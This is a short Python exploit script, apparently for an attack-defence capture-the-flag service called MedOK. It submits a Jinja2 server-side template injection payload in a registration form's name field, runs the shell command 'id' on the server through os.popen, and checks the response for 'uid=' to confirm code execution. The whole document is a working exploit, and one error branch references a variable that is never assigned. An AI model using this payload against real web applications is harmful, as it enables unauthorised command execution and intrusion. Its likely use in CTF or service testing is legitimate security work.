# Sploit (SSTI) for MedOK
# Author: boomgarang

import aiohttp
import asyncio
from colorama import Fore, Style
from medok_sploit__helper import delete_user_from_db

async def sploit_ssti(HOST, PORT):
    payload = "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}"
    email = f"ssti_test_{PORT}@example.com"
    register_data = {
        "name": payload,
        "email": email,
        "password": "testpassword"
    }
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(f'http://{HOST}:{PORT}/register', data=register_data) as response:
                if response.status == 200:
                    text_resp = await response.text()
                    delete_status = await delete_user_from_db(email)
                    if delete_status[0] != 101:
                        return delete_status
                    if "uid=" in text_resp:
                        print(Fore.GREEN + "[+] SSTI exploit successful" + Style.RESET_ALL)
                        return 101, None
                    else:
                        print(Fore.RED + f"[-] SSTI exploit failed" + Style.RESET_ALL)
                        return 102, None
                else:
                    print(Fore.RED + f"[-] Registration error: {text_resp}" + Style.RESET_ALL)
                    await delete_user_from_db(email)
                    return 110, None
    except Exception as e:
        print(Fore.RED + f"[-] An error occurred: {e}" + Style.RESET_ALL)
        await delete_user_from_db(email)
        return 110, None

async def pwn(HOST):
    VERDICT = await sploit_ssti(HOST, 5000)
    print(VERDICT)
    return VERDICT

loop = asyncio.get_event_loop()
loop.run_until_complete(pwn('localhost'))
